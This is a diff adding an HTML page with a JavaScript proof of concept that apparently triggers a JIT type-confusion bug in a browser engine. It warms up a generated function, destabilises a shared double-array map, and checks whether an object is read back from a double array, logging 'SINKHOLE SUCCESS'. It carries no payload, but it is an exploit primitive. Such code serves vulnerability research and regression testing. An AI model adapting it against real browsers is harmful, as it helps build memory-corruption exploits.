@@ -1,0 +1,43 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const N_BLOCKS = 650;
+const lines = ["function trigger(x, arr, obj, limit) {"];
+for (let i = 0; i < N_BLOCKS; i++) {
+  lines.push(`  if (x === ${i}) return ${i};`);
+}
+lines.push(`
+  arr[0] = obj;
+  let i = 0;
+  let res = 0;
+  while (i < limit) {
+    res = arr[1];
+    i++;
+  }
+  return res;
+}`);
+lines.push("return trigger;");
+const trigger = new Function(lines.join("\n"))();
+
+// Adding a named-property transition to the shared double-array map makes
+// that source map unstable while retaining Array.prototype and fast elements.
+const poison = [1.1, 2.2, 3.3];
+poison.sinkhole = 1;
+
+const obj = {marker: 1};
+function freshDouble() {
+  return [1.1, 2.2, 3.3];
+}
+
+for (let i = 0; i < 30000; i++) {
+  trigger(1000, freshDouble(), obj, 1);
+}
+console.log("warmup complete");
+
+setTimeout(() => {
+  const victim = freshDouble();
+  const result = trigger(1000, victim, obj, 1);
+  console.log("result", typeof result, result, "victim0", typeof victim[0], victim[0]);
+  if (typeof result === "object") console.log("SINKHOLE SUCCESS", result);
+}, 2000);
+</script>
